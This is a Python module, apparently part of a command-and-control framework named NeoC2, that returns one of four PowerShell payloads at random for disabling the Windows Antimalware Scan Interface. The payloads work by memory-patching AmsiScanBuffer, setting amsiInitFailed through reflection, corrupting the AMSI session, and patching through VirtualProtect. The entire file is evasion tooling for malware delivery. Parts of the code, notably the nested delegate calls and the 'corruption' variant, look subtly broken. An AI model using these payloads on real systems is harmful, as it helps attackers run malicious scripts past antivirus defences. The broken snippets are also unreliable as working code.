import os
import random
import string
import base64
from core.config import NeoC2Config

class AMSIBypass:
    def __init__(self, config):
        self.config = config
        self.bypass_techniques = [
            "memory_patch",
            "reflection",
            "corruption",
            "unhooking"
        ]
    
    def bypass(self):
        technique = random.choice(self.bypass_techniques)
        
        if technique == "memory_patch":
            return self._memory_patch()
        elif technique == "reflection":
            return self._reflection_bypass()
        elif technique == "corruption":
            return self._corruption_bypass()
        elif technique == "unhooking":
            return self._unhooking_bypass()
        
        return None
    
    def _memory_patch(self):
        return '''
# AMSI Memory Patch Bypass
$amsiContext = [IntPtr].Assembly.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetModuleHandle').Invoke($null, @('amsi.dll'))
$amsiScanBufferPtr = [IntPtr].Assembly.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetProcAddress').Invoke($null, @($amsiContext, 'AmsiScanBuffer'))
        
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
        
$oldProtect = 0
$virtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
            [IntPtr].Assembly.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetModuleHandle').Invoke($null, @('kernel32.dll')),
            [System.Func[IntPtr, String, IntPtr]]::class
        ).Invoke('VirtualProtect'),
        [System.Func[IntPtr, IntPtr, UInt32, [UInt32].MakeByRefType(), Boolean]]::class
    ),
    [System.Func[IntPtr, IntPtr, UInt32, [UInt32].MakeByRefType(), Boolean]]::class
)
        
$virtualProtect.Invoke($amsiScanBufferPtr, [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$patch.GetType()), 0x40, [ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBufferPtr, $patch.Length)
$virtualProtect.Invoke($amsiScanBufferPtr, [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$patch.GetType()), $oldProtect, [ref]$oldProtect)
'''
    
    def _reflection_bypass(self):
        return '''
# AMSI Reflection Bypass
$method = ([System.Management.Automation.PSObject].Assembly.GetType('System.Management.Automation.AmsiUtils')).GetMethod('ScanContent', [System.Reflection.BindingFlags]'NonPublic,Static')
$field = $method.DeclaringType.GetField('amsiInitFailed', 'NonPublic,Static')
$field.SetValue($null, $true)
'''
    
    def _corruption_bypass(self):
        return '''
# AMSI Corruption Bypass
$amsiUtils = [System.Management.Automation.PSObject].Assembly.GetType('System.Management.Automation.AmsiUtils')
$amsiContext = $amsiUtils.GetField('amsiContext', 'NonPublic,Static').GetValue($null)
$handle = $amsiUtils.GetMethods('NonPublic,Static') | Where-Object { $_.Name -eq 'GetField' } | ForEach-Object { $_.Invoke($null, @($amsiContext, 'amsiSession')) }
$amsiSession = $handle.GetType().GetField('NonPublic,Static').GetValue($handle)
$amsiSession.GetType().GetField('NonPublic,Static').SetValue($amsiSession, $null)
'''
    
    def _unhooking_bypass(self):
        return '''
# AMSI Unhooking Bypass
$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $win32

$amsiDll = [Win32]::GetModuleHandle("amsi.dll")
$amsiScanBuffer = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")

$oldProtect = 0
[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]5, 0x40, [ref]$oldProtect)

$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuffer, 6)

[Win32]::VirtualProtect($amsiScanBuffer, [UIntPtr]5, $oldProtect, [ref]$oldProtect)
'''
